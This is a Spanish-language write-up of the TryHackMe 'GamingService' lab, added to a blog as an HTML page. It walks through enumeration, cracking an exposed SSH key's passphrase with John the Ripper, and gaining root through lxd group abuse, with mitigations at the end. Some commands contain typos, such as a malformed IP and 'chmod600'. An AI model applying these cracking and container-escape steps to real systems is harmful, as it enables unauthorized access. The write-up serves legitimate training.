@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina GamingService TryHackMe | ZsZsec</title>
+<meta content="Writeup: GamingService TryHackMe Introducción Este writeup documenta la explotación de la máquina GamingService en la plataforma TryHackMe. Se detalla el proceso desde el reconocim..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina GamingService TryHackMe<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / web / dirsearch</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">web</span><span class="tag">dirsearch</span><span class="tag">johntheripper</span><span class="tag">ssh2john</span><span class="tag">id_rsa</span><span class="tag">ssh</span><span class="tag">fuerza_bruta</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h1>Writeup: GamingService (TryHackMe)</h1>
+<h2>Introducción</h2>
+<p>Este writeup documenta la explotación de la máquina <strong>GamingService</strong> en la plataforma TryHackMe. Se detalla el proceso desde el reconocimiento inicial hasta la exploración de vulnerabilidades encontradas.</p>
+<h2>Reconocimiento Inicial</h2>
+<h3>Escaneo de Puertos</h3>
+<p>Se realizó un escaneo inicial con <strong>Nmap</strong> para identificar los puertos abiertos en la máquina objetivo.</p>
+<pre><code class="language-bash">┌──(zikuta㉿zikuta)-[~]
+└─$ nmap -A --top-ports 100 10.10.163.91 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 17:01 CDT
+Nmap scan report for 10.10.163.91
+Host is up (0.18s latency).
+Not shown: 98 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
+|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
+|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: House of danak
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.15
+OS details: Linux 4.15
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   183.77 ms 10.23.0.1
+2   183.88 ms 10.10.163.91
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.43 seconds
+</code></pre>
+<p><strong>Resultados:</strong></p>
+<ul>
+<li><strong>Puerto 22 (SSH):</strong> Servidor SSH activo.</li>
+<li><strong>Puerto 80 (HTTP):</strong> Servidor web activo.</li>
+</ul>
+<h3>Análisis del Servidor Web</h3>
+<p>Navegando al puerto 80, se encontró un servidor web funcional. Para identificar posibles recursos ocultos, se realizó un escaneo de directorios con <strong>dirsearch</strong>.</p>
+<h2>Escaneo de Directorios</h2>
+<p>El comando ejecutado fue:</p>
+<pre><code class="language-bash">                                                                            
+┌──(zikuta㉿zikuta)-[~]
+└─$ dirsearch -u http://10.10.163.91         
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                             
+ (_||| _) (/_(_|| (_| )                                                      
+                                                                             
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
+Wordlist size: 11460
+
+Output File: /home/zikuta/reports/http_10.10.163.91/_25-06-13_17-02-00.txt
+
+Target: http://10.10.163.91/
+
+[17:02:00] Starting:                                                         
+[17:02:09] 403 -  277B  - /.ht_wsr.txt                                      
+[17:02:09] 403 -  277B  - /.htaccess.bak1                                   
+[17:02:09] 403 -  277B  - /.htaccess.orig                                   
+[17:02:09] 403 -  277B  - /.htaccess.sample
+[17:02:09] 403 -  277B  - /.htaccess.save
+[17:02:09] 403 -  277B  - /.htaccess_orig                                   
+[17:02:09] 403 -  277B  - /.htaccess_extra
+[17:02:09] 403 -  277B  - /.htaccess_sc
+[17:02:09] 403 -  277B  - /.htaccessBAK
+[17:02:09] 403 -  277B  - /.htaccessOLD
+[17:02:09] 403 -  277B  - /.htaccessOLD2
+[17:02:09] 403 -  277B  - /.html                                            
+[17:02:09] 403 -  277B  - /.htm                                             
+[17:02:09] 403 -  277B  - /.htpasswds                                       
+[17:02:09] 403 -  277B  - /.htpasswd_test
+[17:02:09] 403 -  277B  - /.httr-oauth
+[17:02:11] 403 -  277B  - /.php                                             
+[17:02:19] 200 -    2KB - /about.php                                        
+[17:02:19] 200 -  524B  - /about.html                                       
+[17:03:18] 200 -   33B  - /robots.txt                                       
+[17:03:19] 200 -  455B  - /secret/                                          
+[17:03:19] 301 -  313B  - /secret  -&gt;  http://10.10.163.91/secret/          
+[17:03:20] 403 -  277B  - /server-status/                                   
+[17:03:20] 403 -  277B  - /server-status
+[17:03:31] 301 -  314B  - /uploads  -&gt;  http://10.10.163.91/uploads/        
+[17:03:31] 200 -  522B  - /uploads/                                         
+Task Completed                    
+</code></pre>
+<p><strong>Resultados principales:</strong></p>
+<ul>
+<li><code>/about.php</code> (200 OK)</li>
+<li><code>/about.html</code> (200 OK)</li>
+<li><code>/robots.txt</code> (200 OK)</li>
+<li><code>/secret/</code> (200 OK)</li>
+<li><code>/uploads/</code> (200 OK)</li>
+<li>Otros directorios como <code>/.htaccess</code>, <code>/.php</code>, etc., retornaron 403 Forbidden.</li>
+</ul>
+<h2>Análisis de Archivos Directorios</h2>
+<h3>Archivo en <code>/uploads/</code>: <code>dic.lst</code></h3>
+<p>Dentro del directorio <code>/uploads/</code>, se identificó un archivo llamado <code>dic.lst</code>. Este archivo contenía una lista extensa de contraseñas. Estas claves serán útiles para futuras tareas de fuerza bruta o descifrado.</p>
+<h3>Archivo en <code>/secret/</code>: <code>id_rsa</code></h3>
+<p>En el directorio <code>/secret/</code>, se encontró un archivo <code>id_rsa</code>. Este archivo es una clave privada SSH que puede utilizarse para acceder al servicio SSH en el puerto 22. Sin embargo, para usarla, se requería una <strong>passphrase</strong> (frase de acceso), que estaba protegida por un hash.</p>
+<h2>Cracking de la <code>id_rsa</code> con John the Ripper</h2>
+<p>Para descifrar la <strong>passphrase</strong>, se utilizó la herramienta <strong>John the Ripper</strong>. Este proceso involucró los siguientes pasos:</p>
+<ol>
+<li><p><strong>Convertir la clave privada en un formato utilizable por John:</strong></p>
+<p>El comando utilizado fue:</p>
+</li>
+</ol>
+<pre><code class="language-bash">python3 /usr/share/jhon/ssh2john.py id_rsa &gt; rsa_hash.txt
+</code></pre>
+<p>Este paso extrae el hash de la clave privada SSH, permitiendo que John lo procese.</p>
+<ol start="2">
+<li><p><strong>Crackear el hash utilizando el archivo <code>dic.lst</code> como diccionario:</strong></p>
+<p>Con el hash extraído, se ejecutó John con el siguiente comando:</p>
+</li>
+</ol>
+<pre><code class="language-bash">                                                                         
+┌──(zikuta㉿zikuta)-[~/Desktop]
+└─$ john --wordlist=contrasenas.txt rsha_hash.txt
+
+</code></pre>
+<p>Esto me dio la contrasena del passphrase de SSH la cual es <code>letmein</code></p>
+<h2>Uso de la Clave SSH Descifrada</h2>
+<p>Con la <strong>passphrase</strong> obtenida (<code>letmein</code>), se intentó acceder al servidor SSH utilizando la clave privada <code>id_rsa</code>.</p>
+<h3>Procedimiento:</h3>
+<ol>
+<li>Cambiar los permisos de la clave privada.</li>
+</ol>
+<pre><code class="language-bash">chmod600 id_rsa
+</code></pre>
+<ol start="2">
+<li>Conectar al servidor SSH:</li>
+</ol>
+<pre><code class="language-bash">ssh john@10.10.10.16.139.30 -i id_rsa
+</code></pre>
+<ol start="3">
+<li>Nos pedira el passphrase y introduciremos <code>letmein</code></li>
+</ol>
+<h2>Explicación Detallada</h2>
+<ul>
+<li><strong>Clave Privada SSH (<code>id_rsa</code>):</strong> Es un archivo utilizado para la autenticación SSH sin contraseña, pero suele estar protegida por una <strong>passphrase</strong> para mayor seguridad.</li>
+<li><strong>Herramienta <code>ssh2john</code>:</strong> Convierte la clave SSH en un hash que puede ser procesado por herramientas de cracking como John the Ripper.</li>
+<li><strong>Cracking con John:</strong> Se realizó un ataque de diccionario utilizando el archivo <code>dic.lst</code>. John probó cada contraseña hasta encontrar la correcta que descifró el hash y reveló la <strong>passphrase</strong>.</li>
+</ul>
+<h1>User Flag</h1>
+<p>ahora en el escritorio como el usuario john procedemos a leer la flag de usuario.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/02058d3e-321a-4aae-a37e-7ff790191ade"/></p>
+<h1>Escalada de privilegios</h1>
+<p>Mientras buscaba vulnerabilidades para escalar privilegios, al momento de ver los grupos a los que pertenecia me encontre algo bastante curioso</p>
+<pre><code class="language-bash">john@exploitable:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+</code></pre>
+<p><strong>Análisis del Grupo LXD y Preparación del Entorno</strong></p>
+<p>Durante la enumeración de privilegios, se identificó que el usuario <code>john</code> pertenecía al grupo <code>lxd</code> (Listado: <code>id</code>). LXD (<em>Linux Container Daemon</em>) es un sistema de gestión de contenedores privilegiados que, si no está correctamente configurado, puede permitir la escalada de privilegios mediante la creación de contenedores con acceso al sistema de archivos del host.</p>
+<h2><strong>¿Qué es Alpine Linux?</strong></h2>
+<p><strong>Alpine Linux</strong> es una distribución de Linux ultra ligera y segura, muy usada en contenedores (Docker, LXC/LXD) por su pequeño tamaño (~5MB) y su enfoque en seguridad (usa <strong>musl libc</strong> en lugar de glibc).</p>
+<ul>
+<li><p><strong>Ventajas para pentesting</strong>:</p>
+<ul>
+<li>Es minimalista (ideal para transferir en entornos restringidos).</li>
+<li>Fácil de modificar para incluir herramientas de explotación.</li>
+</ul>
+</li>
+</ul>
+<p>la descargamos en nuestra maquina host</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/b19ea0d1-36e5-4ac7-b8a5-bb17bf32d729"/></p>
+<h2><strong>¿Por qué lo necesitamos para explotar LXD?</strong></h2>
+<p>Para abusar del grupo <code>lxd</code>, necesitamos:</p>
+<ol>
+<li><strong>Una imagen de contenedor maliciosa</strong>:</li>
+</ol>
+<ul>
+<li>Debe permitir ejecutar comandos como <strong>root</strong> en el host.</li>
+</ul>
+<ul>
+<li>Alpine es ideal porque es pequeño y fácil de manipular.</li>
+</ul>
+<p><strong>Montar el sistema de archivos del host:</strong></p>
+<ul>
+<li>El builder crea una imagen que podemos configurar para montar / (directorio raíz del host) dentro del contenedor.</li>
+</ul>
+<p><strong>Evitar dependencias complejas</strong>:</p>
+<ul>
+<li>Otras imágenes (Ubuntu, CentOS) son más grandes y pueden fallar en entornos sin internet.</li>
+<li>Alpine pesa ~5MB (fácil de transferir incluso con <code>wget</code> o <code>python3 -m http.server</code>).</li>
+</ul>
+<p>despues de instalar el software procederemos a hostearlo en el puerto 80 para luego descargarnoslo desde la maquina victima</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/fce57e05-9a35-4c2b-bf9b-c353eccd7e56"/></p>
+<p>luego en la maquina victima procederemos a descargar el archivo</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/f7b49494-6b9a-4de0-89c7-6431aae91d04"/></p>
+<p>El primer paso crítico es importar la imagen de Alpine Linux que generamos previamente (o descargamos) en el sistema vulnerable usando el comando <code>lxc image import</code>.</p>
+<pre><code class="language-bash">john@exploitable:~$ lxc image import  ./alpine-v3.22-x86_64-20250815_1746.tar.gz --alias myimage
+Image imported with fingerprint: 8cc7ac3fa7474017aebfa712aebb9c730904be6d3f15f82b04d9572dccc2b865
+</code></pre>
+<h2>Qué hace este comando?</h2>
+<p><code>lxc image import:</code></p>
+<ul>
+<li><strong>Es el comando de LXD para cargar una nueva imagen en su repositorio local</strong>.</li>
+<li><strong>Las imágenes en LXD son plantillas que se usan para crear contenedores</strong>.</li>
+</ul>
+<p><code>./alpine-v3.14-x86_64-20210804_1750.tar.gz:</code></p>
+<ul>
+<li><strong>Es el archivo comprimido que contiene el sistema de archivos de Alpine Linux</strong>.</li>
+<li><strong>Este archivo fue generado previamente con el script build-alpine y transferido al sistema objetivo.</strong></li>
+</ul>
+<p><code>--alias myimage:</code></p>
+<ul>
+<li><strong>Asigna un nombre fácil de recordar (myimage) a la imagen importada.</strong></li>
+<li><strong>Esto evita tener que referirse a la imagen por su nombre largo (alpine-v3.14...).</strong></li>
+</ul>
+<h2>¿Por qué es necesario?</h2>
+<ul>
+<li><strong>Sin importar la imagen, no podríamos crear un contenedor.</strong></li>
+<li><strong>LXD trabaja con imágenes predefinidas (como Docker), y necesitamos una que podamos controlar para explotar el sistema.</strong></li>
+</ul>
+<h2><strong>Crear un Contenedor Privilegiado y Montar el Sistema de Archivos del Host</strong></h2>
+<p>Una vez importada la imagen, el siguiente paso es crear un contenedor basado en ella, pero con configuraciones especiales que permitan el acceso al sistema de archivos del host.</p>
+<pre><code class="language-bash">john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
+Creating ignite
+</code></pre>
+<h3><strong>Explicación Detallada:</strong></h3>
+<h4><strong>1. <code>lxc init myimage ignite -c security.privileged=true</code></strong></h4>
+<ul>
+<li><p><strong><code>lxc init</code></strong>: Crea un nuevo contenedor (similar a <code>docker create</code>).</p>
+</li>
+<li><p><strong><code>myimage</code></strong>: Es la imagen que importamos previamente.</p>
+</li>
+<li><p><strong><code>ignite</code></strong>: Nombre que le damos al contenedor (podría ser cualquier otro).</p>
+</li>
+<li><p><strong><code>-c security.privileged=true</code></strong>:</p>
+<ul>
+<li>Esta es la parte <strong>más importante</strong> del exploit.</li>
+</ul>
+</li>
+<li><p>Por defecto, los contenedores LXD se ejecutan en un entorno aislado (sin acceso completo al host).</p>
+<ul>
+<li>Al establecer <code>security.privileged=true</code>, el contenedor se ejecutará con <strong>privilegios de root en el sistema host</strong>, rompiendo el aislamiento.</li>
+</ul>
+</li>
+</ul>
+<p>Luego ejecutaremos el comando</p>
+<pre><code class="language-bash">john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+</code></pre>
+<p><code>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true</code></p>
+<p>Este comando configura un "dispositivo" en el contenedor que <strong>monta el directorio raíz (<code>/</code>) del host</strong> dentro del contenedor.</p>
+<ul>
+<li><strong><code>ignite</code></strong>: Nombre del contenedor.</li>
+<li><strong><code>mydevice</code></strong>: Nombre arbitrario para el dispositivo (podría ser <code>hostroot</code> o similar).</li>
+<li><strong><code>disk</code></strong>: Tipo de dispositivo (en este caso, un disco virtual).</li>
+<li><strong><code>source=/</code></strong>: Indica que el origen es el directorio raíz (<code>/</code>) del <strong>host</strong> (no del contenedor).</li>
+<li><strong><code>path=/mnt/root</code></strong>: Monta el directorio raíz del host en <code>/mnt/root</code> dentro del contenedor.</li>
+<li><strong><code>recursive=true</code></strong>: Asegura que todos los subdirectorios también sean accesibles.</li>
+</ul>
+<h4><strong>3. <code>lxc start ignite</code></strong></h4>
+<ul>
+<li>Simplemente inicia el contenedor (<code>ignite</code>).</li>
+<li>Sin esto, el contenedor estaría creado pero no en ejecución.</li>
+</ul>
+<h2><strong>Ejecutar una Shell en el Contenedor y Escalar a Root</strong></h2>
+<p>Finalmente, ejecutamos una shell dentro del contenedor y usamos el comando <code>lxc exec ignite /bin/sh</code></p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/d8acb7cd-d2d5-4279-bc14-b22c4324671d"/></p>
+<p>y finalmente obtuvimos ROOT!!</p>
+<h3><strong>¿Por qué esto nos da acceso root?</strong></h3>
+<ul>
+<li>Al montar <code>/</code> del host en <code>/mnt/root</code> dentro del contenedor, <strong>tenemos acceso a TODO el sistema de archivos del host</strong>.</li>
+<li>Como el contenedor se ejecuta en modo privilegiado (<code>security.privileged=true</code>), podemos modificar archivos críticos como:<ul>
+<li><code>/etc/shadow</code> (para cambiar la contraseña de root).</li>
+<li><code>/root/.ssh/authorized_keys</code> (para agregar una clave SSH y acceder como root).</li>
+<li>Cualquier otro archivo del sistema.</li>
+</ul>
+</li>
+</ul>
+<h3>Conclusión</h3>
+<p>La explotación de la máquina <strong>GamingService</strong> en TryHackMe demostró una serie de vulnerabilidades críticas que permitieron obtener acceso no autorizado y escalar privilegios hasta convertirse en <strong>root</strong>. A continuación, se detallan los puntos clave que facilitaron la vulneración del sistema, cómo se llevó a cabo el ataque y las posibles medidas de mitigación.</p>
+<h4>Puntos Clave que Permitieron el Acceso Total:</h4>
+<ol>
+<li><p><strong>Exposición de información sensible</strong>:</p>
+<ul>
+<li>Se encontró un archivo <code>id_rsa</code> (clave privada SSH) en el directorio <code>/secret/</code>, protegido por una passphrase.</li>
+<li>El archivo <code>dic.lst</code> en <code>/uploads/</code> contenía contraseñas potenciales, lo que facilitó el cracking de la passphrase.</li>
+</ul>
+</li>
+<li><p><strong>Uso de credenciales débiles</strong>:</p>
+<ul>
+<li>La passphrase de la clave SSH (<code>letmein</code>) era fácil de descifrar con un ataque de diccionario.</li>
+</ul>
+</li>
+<li><p><strong>Mala configuración de permisos</strong>:</p>
+<ul>
+<li>El usuario <code>john</code> pertenecía al grupo <code>lxd</code>, lo que permitió abusar de contenedores privilegiados para escalar a root.</li>
+</ul>
+</li>
+<li><p><strong>Falta de hardening en LXD</strong>:</p>
+<ul>
+<li>No se restringió el uso de contenedores privilegiados, lo que permitió montar el sistema de archivos del host y modificar archivos críticos.</li>
+</ul>
+</li>
+</ol>
+<h4>Técnicas Utilizadas:</h4>
+<table>
+<thead>
+<tr>
+<th><strong>Técnica</strong></th>
+<th><strong>Herramienta/Comando</strong></th>
+<th><strong>Propósito</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Escaneo de puertos</td>
+<td><code>nmap -A --top-ports 100</code></td>
+<td>Identificar servicios activos (SSH en puerto 22, HTTP en puerto 80).</td>
+</tr>
+<tr>
+<td>Escaneo de directorios</td>
+<td><code>dirsearch -u &lt;URL&gt;</code></td>
+<td>Encontrar recursos ocultos (<code>/secret/</code>, <code>/uploads/</code>, <code>robots.txt</code>).</td>
+</tr>
+<tr>
+<td>Fuerza bruta con diccionario</td>
+<td><code>john --wordlist=dic.lst</code></td>
+<td>Descifrar la passphrase de la clave SSH (<code>id_rsa</code>).</td>
+</tr>
+<tr>
+<td>Explotación de grupo <code>lxd</code></td>
+<td><code>lxc init</code>, <code>lxc config</code></td>
+<td>Crear un contenedor privilegiado para montar el sistema de archivos del host.</td>
+</tr>
+<tr>
+<td>Escalada de privilegios</td>
+<td><code>lxc exec ignite /bin/sh</code></td>
+<td>Obtener una shell como root dentro del contenedor.</td>
+</tr>
+</tbody>
+</table>
+<h4>Posibles Medidas de Mitigación:</h4>
+<ol>
+<li><p><strong>Protección de archivos sensibles</strong>:</p>
+<ul>
+<li>Evitar almacenar claves privadas (<code>id_rsa</code>) o diccionarios de contraseñas en directorios accesibles públicamente.</li>
+<li>Usar permisos estrictos (ej: <code>chmod 600</code> para claves SSH).</li>
+</ul>
+</li>
+<li><p><strong>Configuración segura de SSH</strong>:</p>
+<ul>
+<li>Implementar autenticación de dos factores (2FA).</li>
+<li>Deshabilitar el acceso SSH con claves débiles o sin passphrase.</li>
+</ul>
+</li>
+<li><p><strong>Restricción de grupos de usuarios</strong>:</p>
+<ul>
+<li>Limitar la membresía en grupos críticos como <code>lxd</code>, <code>sudo</code>, o <code>docker</code> solo a usuarios necesarios.</li>
+</ul>
+</li>
+<li><p><strong>Hardening de LXD/LXC</strong>:</p>
+<ul>
+<li>Deshabilitar contenedores privilegiados (<code>security.privileged=false</code>).</li>
+<li>Aplicar políticas de seguridad para evitar el montaje de directorios del host.</li>
+</ul>
+</li>
+<li><p><strong>Monitoreo y auditoría</strong>:</p>
+<ul>
+<li>Revisar logs de acceso a servicios como Apache y SSH para detectar actividades sospechosas.</li>
+<li>Usar herramientas como <code>auditd</code> para rastrear cambios críticos en el sistema.</li>
+</ul>
+</li>
+</ol>
+<h4>Reflexión Final:</h4>
+<p>Este caso resalta la importancia de la configuración segura y la gestión adecuada de credenciales. Pequeños descuidos, como exponer archivos sensibles o permitir grupos innecesarios, pueden llevar a compromisos totales del sistema. La mitigación requiere un enfoque proactivo, combinando hardening, monitoreo y educación en seguridad para los administradores.</p>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
